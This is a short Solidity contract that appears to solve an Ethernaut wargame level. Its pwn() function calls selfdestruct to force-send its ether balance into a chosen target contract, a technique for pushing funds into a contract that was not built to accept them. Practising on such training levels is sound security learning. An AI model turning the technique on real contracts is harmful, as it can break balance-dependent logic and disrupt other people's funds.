//SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

contract SelfDestruct {
    address target;

    constructor(address $your_ethernaut_address_here) {
        target = $your_ethernaut_address_here;
    }

    function pwn() public payable {
        selfdestruct(payable(target));
    }

    receive() external payable {}
}